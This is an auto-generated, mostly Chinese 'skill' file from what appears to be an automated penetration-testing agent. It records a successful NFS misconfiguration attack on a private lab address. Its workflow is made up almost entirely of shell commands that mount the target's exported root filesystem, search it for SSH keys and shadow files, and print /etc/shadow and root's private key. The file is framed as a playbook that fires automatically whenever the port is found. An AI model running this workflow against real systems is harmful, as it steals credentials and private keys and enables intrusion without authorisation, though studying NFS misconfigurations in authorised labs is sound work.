---
name: auto-nfs-mount
description: 自动学习的 nfs-mount exploit 技能。已验证成功。目标: rpcbind:2049
domain: penetration-testing
subdomain: auto-learned
tags:
  - nfs-mount
  - misconfig
  - auto-learned
  - easy
version: '1.0'
metadata:
  generated_at: 2026-06-22T13:28:25.179544
  target: 192.168.136.137
  success: True
  elapsed_seconds: 4.5
  difficulty: easy
  category: misconfig
  evidence: ["root", "root", "verify: Export list for 192.168.136.137:\n/ *"]
---

# Auto-Learned Skill: nfs-mount

## When to Use
当检测到 **rpcbind** 服务 (端口 2049) 时自动触发。
类别: misconfig | 难度: easy | 状态: 已验证成功

## Prerequisites
- Kali Linux with metasploit-framework
- 目标端口 2049 开放

## Workflow

### 执行步骤 (耗时 4.5s)

#### Step 1
```bash
showmount -e 192.168.136.137
```

#### Step 2
```bash
mkdir -p /tmp/nfs_pentest && mount -t nfs 192.168.136.137:/ /tmp/nfs_pentest -o nolock 2>/dev/null; find /tmp/nfs_pentest -maxdepth 3 \( -name 'id_rsa' -o -name 'shadow' -o -name '.rhosts' -o -name 'authorized_keys' \) 2>/dev/null
```

#### Step 3
```bash
cat /tmp/nfs_pentest/etc/shadow 2>/dev/null | head -5
```

#### Step 4
```bash
cat /tmp/nfs_pentest/root/.ssh/id_rsa 2>/dev/null
```

### 成功证据
```
- root
- root
- verify: Export list for 192.168.136.137:
/ *
```

## Optimization Notes
- 实际耗时: 4.5s
- 难度评级: easy
- 可靠性: 高

## Key Concepts
| 属性 | 值 |
|------|-----|
| 目标服务 | rpcbind |
| 目标端口 | 2049 |
| 攻击类别 | misconfig |
| 成功状态 | 已验证成功 |
| 耗时 | 4.5s |
